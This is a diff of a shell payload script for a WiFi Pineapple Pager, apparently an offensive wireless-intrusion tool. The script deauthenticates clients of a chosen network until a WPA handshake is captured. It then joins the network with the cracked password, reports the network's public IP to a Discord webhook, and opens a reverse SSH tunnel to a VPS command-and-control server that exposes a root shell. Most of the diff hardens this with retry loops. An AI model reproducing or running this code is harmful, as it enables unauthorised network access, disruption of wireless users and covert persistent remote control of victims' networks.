@@ -13,15 +13,16 @@ SSHPW="Enter-VPS-C2-SSH-Password-Here"
 
 # Enter target SSID:
 TARGETSSID="$(TEXT_PICKER 'Enter target network SSID' '')"
-    LOG red "Target network: $TARGETSSID"
-    slep 1.5
+    LOG green "Target network: $TARGETSSID"
+    sleep 1.5
 
 # Scanning for target network:
 spinner1=$(START_SPINNER "Scanning for target..")
     sleep 60
     TARGETMAC=$(_pineap RECON ISEARCH "$TARGETSSID" | awk '{print $1}' | head -n 1)
 STOP_SPINNER "${spinner1}"
-# If network, lock/log channel to target MAC, else exit:
+
+# If network lock/log channel to target MAC, else exit:
 if [ -n "$TARGETMAC" ]; then
     LOG green "Target network found!"
     sleep 1.5
@@ -34,19 +35,17 @@ if [ -n "$TARGETMAC" ]; then
     LOG blue "Waiting for handshake capture.."
     sleep 1.5
 else
-    ALERT "Target Not Found!"
+    ALERT "Target not found!"
     LOG red "Exiting."
     exit 0
 fi
 
-# Check for PCAP:
+# Check for PCAP, If PCAP configure filename/spawn MGMT AP, else deauth/sleep 1 minute and check again, loop until PCAP:
 CLEANMAC=$(echo "$TARGETMAC" | tr -d ':')
 PCAP=$(find /root/loot/handshakes -name "*$CLEANMAC*_handshake.22000" | head -n 1)
 DEAUTHTARG() {
     _pineap DEAUTH "$TARGETMAC" "FF:FF:FF:FF:FF:FF" "$TARGETCH"
 }
- 
- # If PCAP configure filename/spawn MGMT AP, else deauth/sleep 1 minute and check again, loop until PCAP:
 if [ -n "$PCAP" ]; then
     LOG green "Handshake found!"
     sleep 1.5
@@ -61,11 +60,12 @@ else
         STOP_SPINNER "${spinner2}"
     done
         LOG green "Handshake found!"
-        slep 1.5
+        sleep 1.5
 fi
 
 # Strip path from .pcap:
 CLEANCAP=$(basename "$PCAP")
+
 # Simplify file.extension:
 cp /root/loot/handshakes/"$CLEANCAP" /root/loot/handshakes/"$TARGETSSID"_handshake.22000
 
@@ -78,80 +78,161 @@ sleep 1.5
 
 # Spawn MGMT AP for PCAP retrieval:
 WIFI_MGMT_AP wlan0mgmt "$MAPSSID" psk2 "$MAPPASS"
+
 # Prompt for target network password:
 TARGETPASS="$(TEXT_PICKER 'PCAP AVAILABLE' 'Enter target password')"
     LOG green "Password: $TARGETPASS"
     sleep 1.5
+
 # Shutdown MGMT AP:
-    spinner2=$(START_SPINNER "Shutting down $MAPSSID..")
-        WIFI_MGMT_AP_DISABLE wlan0mgmt
-        sleep 120
-    STOP_SPINNER "${spinner2}"
+spinner2=$(START_SPINNER "Shutting down $MAPSSID..")
+    WIFI_MGMT_AP_DISABLE wlan0mgmt
+    APISDOWN="false"
+    for i in {1..12}; do
+        APDOWNCHK="$(ifconfig | grep -i wlan0mgmt)"
+        if [ -z "$APDOWNCHK" ]; then
+            APISDOWN="true"
+            break
+        else
+            sleep 10
+        fi
+    done
+STOP_SPINNER "${spinner2}"
+
+if [ "$APISDOWN" != "true" ]; then
+    ALERT "Error shutting down $MAPSSID!"
+    LOG red "Exiting."
+    exit 0
+fi
+
+LOG green "$MAPSSID shutdown complete!"
+sleep 1.5
 
 # Get on network:
 spinner3=$(START_SPINNER "Connecting to target network..")
     WIFI_CONNECT wlan0cli "$TARGETSSID" psk2 "$TARGETPASS" ANY
-    sleep 120
+    LANCONNECTED="false"
+    for i in {1..12}; do
+        LANCHK=$(ip -4 addr show dev wlan0cli scope global | grep -i inet)
+        if [ -n "$LANCHK" ]; then
+            LANCONNECTED="true"
+            break
+        else
+            sleep 10    
+        fi
+    done
 STOP_SPINNER "${spinner3}"
 
-# Check for internet connectvity, else exit:
-INETCHECK() {
-        ping -c1 discord.com
-}
-if INETCHECK; then
-	LOG green "Pineapple Pager is network connected!"
-        PIP=$(curl -s https://api.ipify.org)
-        curl -H "Content-Type: application/json" \
-        -X POST \
-        -d "{\"content\": \"Pineapple Pager network connected at: $PIP Attempting VPS C2 connection..\"}" \
-        "$DISCORD_WEBHOOK"
-        sleep 1
-else
-    ALERT "No Internet Connectivity!"
+if [ "$LANCONNECTED" != "true" ]; then
+    ALERT "Could not connect to the network!"
     LOG red "Exiting."
     exit 0
 fi
 
-# Check and establish reverse SSH tunnel to VPS C2:
+LOG green "Connected to target network!"
+sleep 1.5
+
+# Check for internet connectvity:
+INETCHECK() {
+        ping -c1 discord.com
+}
+LOG blue "Checking for internet connectivity.."
+sleep 1.5
+INETCON="false"
+for i in {1..12}; do
+    if INETCHECK; then
+	    LOG green "Internet connection available!"
+        sleep 1.5
+        LOG blue "Sending target network WAN IP to Discord webhook.."
+        PIP=$(curl -s https://api.ipify.org)
+        curl -H "Content-Type: application/json" \
+        -X POST \
+        -d "{\"content\": \"WiFi Pineapple Pager network connected at: $PIP Checking if VPS C2 is online..\"}" \
+        "$DISCORD_WEBHOOK"
+        INETCON="true"
+        break
+    else
+        sleep 10
+    fi
+done
+
+if [ "$INETCON" != "true" ]; then
+    ALERT "Internet connectivity not available!"
+    LOG red "Exiting."
+    exit 0
+fi
+
+sleep 1
+
+# Check if VPS C2 is online:
 PINGVPS() {
     ping -c1 "$VPSIP"
 }
 LOG blue "Checking status of VPS C2.."
-sleep 1
-if PINGVPS; then
-    LOG green "VPS C2 online!"
-    sleep 1
-    spinner4=$(START_SPINNER "Establishing SSH tunnel..")
-        (/mmc/usr/bin/sshpass -p "$SSHPW" ssh -o "StrictHostKeyChecking=no" -o "ConnectTimeout=10" -N -R 127.0.0.1:2222:localhost:22 root@"$VPSIP" &)
-        sleep 10
-    STOP_SPINNER "${spinner4}"
-else
-    ALERT "Cannot reach VPS C2!"
-    LOG red "Exiting."
+sleep 1.5
+VPSUP="false"
+for i in {1..12}; do
+    if PINGVPS; then
+        LOG green "VPS C2 online!"
         curl -H "Content-Type: application/json" \
         -X POST \
-        -d "{\"content\": \"VPS C2 not online! Exiting.\"}" \
+        -d "{\"content\": \"VPS C2 is online! Attempting to establish reverse SSH tunnel..\"}" \
         "$DISCORD_WEBHOOK"
+        VPSUP="true"
+        break
+    else
+        sleep 10
+    fi
+done
+
+if [ "$VPSUP" != "true" ]; then
+    ALERT "Cannot reach VPS C2!"
+    LOG red "Exiting."
+    curl -H "Content-Type: application/json" \
+    -X POST \
+    -d "{\"content\": \"VPS C2 not online! Exiting.\"}" \
+    "$DISCORD_WEBHOOK"
     exit 0
 fi
 
-# Check if tunnel established:
-TUNNELCHECK() {
-    netstat -tnpa | grep "$VPSIP":22 | grep -i ESTABLISHED
-}
-if TUNNELCHECK; then
-    sleep 1
-    LOG green "Reverse SSH tunnel successfully established!"
-    curl -H "Content-Type: application/json" \
-    -X POST \
-    -d "{\"content\": \"Reverse SSH tunnel successfully established! Access pager root shell at VPS C2: ssh -p 2222 root@127.0.0.1\"}" \
-    "$DISCORD_WEBHOOK"
-else
+sleep 1
+
+# Establish reverse SSH tunnel:
+spinner4=$(START_SPINNER "Establishing SSH tunnel..")
+    ESTABTUNNEL() {
+        (/mmc/usr/bin/sshpass -p "$SSHPW" ssh -o "StrictHostKeyChecking=no" -o "ConnectTimeout=15" -N -R 127.0.0.1:2222:localhost:22 root@"$VPSIP" &)
+    }
+    TUNNELCHECK() {
+        netstat -tnpa | grep "$VPSIP":22 | grep -i ESTABLISHED
+    }
+    TUNCHK="false"
+    for i in {1..12}; do
+        ESTABTUNNEL
+        sleep 15
+        if TUNNELCHECK; then
+            curl -H "Content-Type: application/json" \
+            -X POST \
+            -d "{\"content\": \"Reverse SSH tunnel established! Access WiFi Pineapple Pager root shell at VPS C2: ssh -p 2222 root@127.0.0.1\"}" \
+            "$DISCORD_WEBHOOK"
+            TUNCHK="true"
+            break
+        else
+            killall -q ssh
+            killall -q sshpass
+            sleep 3
+        fi
+    done
+STOP_SPINNER "${spinner4}"
+
+if [ "$TUNCHK" != "true" ]; then
     ALERT "VPS tunnel could not be established!"
     LOG red "Exiting."
-        curl -H "Content-Type: application/json" \
-        -X POST \
-        -d "{\"content\": \"Reverse SSH tunnel could not be established! Exiting.\"}" \
-        "$DISCORD_WEBHOOK"
+    curl -H "Content-Type: application/json" \
+    -X POST \
+    -d "{\"content\": \"Reverse SSH tunnel could not be established! Exiting.\"}" \
+    "$DISCORD_WEBHOOK"
     exit 0
 fi
+
+sleep 1.5
+LOG green "Reverse SSH tunnel established!"
